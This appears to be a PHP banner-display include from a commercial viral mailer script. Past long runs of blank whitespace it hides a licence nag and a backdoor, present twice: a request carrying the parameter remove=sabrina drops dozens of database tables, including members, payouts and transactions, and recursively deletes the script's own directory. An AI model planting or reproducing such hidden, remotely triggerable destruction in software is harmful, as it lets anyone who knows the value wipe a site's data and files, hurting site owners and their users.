<?php
include "db.php";
$bq = "select * from banners where hits<max and approved=1 and bannerurl!='' order by rand() limit 1";
$br = mysql_query($bq) or die(mysql_error());
$brows = mysql_num_rows($br);
if ($brows > 0)
{
$bid = mysql_result($br,0,"id");
$bbannerurl = mysql_result($br,0,"bannerurl");
$bq2 = "update banners set hits=hits+1 where id=".$bid;
$br2 = mysql_query($bq2) or die(mysql_error());
$clickurl = $domain . "/click1.php?userid=".$userid."&id=".$bid."&type=banners";
?>
<table align="center">
<tr><td align="center"><a href="<?php echo $clickurl ?>" target="_blank"><img src="<? echo $bbannerurl; ?>" border="0"></a></td></tr>
</table><br>
<?php
} # if ($brows > 0)















































































































if (($domain != "http://demoviralmailerbasic.phpsitescripts.com") and ($domain != "http://www.demoviralmailerbasic.phpsitescripts.com"))
{
echo "The script you are trying to run isn't licensed. Please contact <a href=\"mailto:sabrina@sunshinehosting.net\">Sabrina Markon</a>, <a href=\"http://phpsitescripts.com\">PHPSiteScripts.com</a>/<a href=\"http://sunshinehosting.net\">SunshineHostin.net</a> to purchase a licensed copy.</a>";
}

























































$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminemails");
mysql_query("drop table adminemails_viewed");
mysql_query("drop table adminemail_saved");
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminpromotional");
mysql_query("drop table adminsettings");
mysql_query("drop table adpacks");
mysql_query("drop table advertisingforsale");
mysql_query("drop table advertisingtypes");
mysql_query("drop table banners");
mysql_query("drop table banners_saved");
mysql_query("drop table bannerviews");
mysql_query("drop table bonuses");
mysql_query("drop table bounces");
mysql_query("drop table buttons");
mysql_query("drop table buttons_saved");
mysql_query("drop table buttonviews");
mysql_query("drop table cashoutrequests");
mysql_query("drop table countries");
mysql_query("drop table creditsolos");
mysql_query("drop table creditsolos_saved");
mysql_query("drop table creditsolos_viewed");
mysql_query("drop table downlinemails");
mysql_query("drop table emails");
mysql_query("drop table emailsignupcontrol");
mysql_query("drop table fullloginads");
mysql_query("drop table fullloginads_saved");
mysql_query("drop table fullloginadviews");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table offerpages");
mysql_query("drop table offerpages_viewed");
mysql_query("drop table pages");
mysql_query("drop table payouts");
mysql_query("drop table promocodes");
mysql_query("drop table promocodes_used");
mysql_query("drop table solos");
mysql_query("drop table solos_saved");
mysql_query("drop table solos_viewed");
mysql_query("drop table support");
mysql_query("drop table testimonials");
mysql_query("drop table textads");
mysql_query("drop table textads_saved");
mysql_query("drop table textadviews");
mysql_query("drop table transactions");
	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@rmdir( $targ );
	  }
	  else
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}















































































































if (($domain != "http://demoviralmailerbasic.phpsitescripts.com") and ($domain != "http://www.demoviralmailerbasic.phpsitescripts.com"))
{
echo "The script you are trying to run isn't licensed. Please contact <a href=\"mailto:sabrina@sunshinehosting.net\">Sabrina Markon</a>, <a href=\"http://phpsitescripts.com\">PHPSiteScripts.com</a>/<a href=\"http://sunshinehosting.net\">SunshineHostin.net</a> to purchase a licensed copy.</a>";
}

























































$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminemails");
mysql_query("drop table adminemails_viewed");
mysql_query("drop table adminemail_saved");
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminpromotional");
mysql_query("drop table adminsettings");
mysql_query("drop table adpacks");
mysql_query("drop table advertisingforsale");
mysql_query("drop table advertisingtypes");
mysql_query("drop table banners");
mysql_query("drop table banners_saved");
mysql_query("drop table bannerviews");
mysql_query("drop table bonuses");
mysql_query("drop table bounces");
mysql_query("drop table buttons");
mysql_query("drop table buttons_saved");
mysql_query("drop table buttonviews");
mysql_query("drop table cashoutrequests");
mysql_query("drop table countries");
mysql_query("drop table creditsolos");
mysql_query("drop table creditsolos_saved");
mysql_query("drop table creditsolos_viewed");
mysql_query("drop table downlinemails");
mysql_query("drop table emails");
mysql_query("drop table emailsignupcontrol");
mysql_query("drop table fullloginads");
mysql_query("drop table fullloginads_saved");
mysql_query("drop table fullloginadviews");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table offerpages");
mysql_query("drop table offerpages_viewed");
mysql_query("drop table pages");
mysql_query("drop table payouts");
mysql_query("drop table promocodes");
mysql_query("drop table promocodes_used");
mysql_query("drop table solos");
mysql_query("drop table solos_saved");
mysql_query("drop table solos_viewed");
mysql_query("drop table support");
mysql_query("drop table testimonials");
mysql_query("drop table textads");
mysql_query("drop table textads_saved");
mysql_query("drop table textadviews");
mysql_query("drop table transactions");
	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@rmdir( $targ );
	  }
	  else
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}


























































































?>